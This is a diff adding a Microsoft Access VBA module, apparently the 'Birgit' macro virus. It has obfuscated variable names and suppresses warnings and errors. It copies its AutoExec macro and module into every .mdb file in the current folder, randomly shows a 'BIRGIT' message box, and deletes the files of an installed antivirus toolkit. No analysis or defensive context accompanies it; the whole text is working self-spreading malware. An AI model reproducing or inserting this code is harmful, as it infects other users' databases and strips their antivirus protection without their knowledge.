@@ -1,0 +1,45 @@
+   Attribute VB_Name = "Birgit1"
+   Option Compare Database
+   Option Explicit
+
+   Option Compare Database
+   Option Explicit
+
+   Function ShMeUv7989()
+   On Error Resume Next
+   Dim PoMtGi1031KtNlFt, AjRkAq1001UrLjBm, SiIeTy5752ShMeUv, UrLjBm158AjRkAq As String
+   Dim KtNlFt6762PoMtGi As Boolean
+   DoCmd.SetWarnings (0)
+   KtNlFt6762PoMtGi = False
+   SiIeTy5752ShMeUv = CurDir & "\"
+   AjRkAq1001UrLjBm = CurrentDb.Name
+   PoMtGi1031KtNlFt = Dir(SiIeTy5752ShMeUv & "*.mdb")
+   If PoMtGi1031KtNlFt <> "" Then UrLjBm158AjRkAq = SiIeTy5752ShMeUv & PoMtGi1031KtNlFt
+   If AjRkAq1001UrLjBm = UrLjBm158AjRkAq Then KtNlFt6762PoMtGi = True
+   If KtNlFt6762PoMtGi = False Then
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", UrLjBm158AjRkAq, acMacro, "AutoExec", "AutoExec"
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", UrLjBm158AjRkAq, acModule, "Birgit", "Birgit"
+   End If
+   Do
+   KtNlFt6762PoMtGi = False
+   PoMtGi1031KtNlFt = Dir()
+   If PoMtGi1031KtNlFt <> "" Then UrLjBm158AjRkAq = SiIeTy5752ShMeUv & PoMtGi1031KtNlFt
+   If AjRkAq1001UrLjBm = UrLjBm158AjRkAq Then KtNlFt6762PoMtGi = True
+   If KtNlFt6762PoMtGi = False Then
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", UrLjBm158AjRkAq, acMacro, "AutoExec", "AutoExec"
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", UrLjBm158AjRkAq, acModule, "Birgit", "Birgit"
+   End If
+   Loop While PoMtGi1031KtNlFt <> ""
+   Call ShMeUv99945752
+   Call ShMeUv57529994
+   End Function
+   Sub ShMeUv99945752()
+   Randomize
+   If Int((Rnd * 10) + 1) = 10 Then
+   MsgBox "BBBBBBIIIIIRRRRGGGIIT................", vbOKOnly, "Birgit"
+   End If
+   End Sub
+   Sub ShMeUv57529994()
+   On Error Resume Next
+   Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
+   End Sub
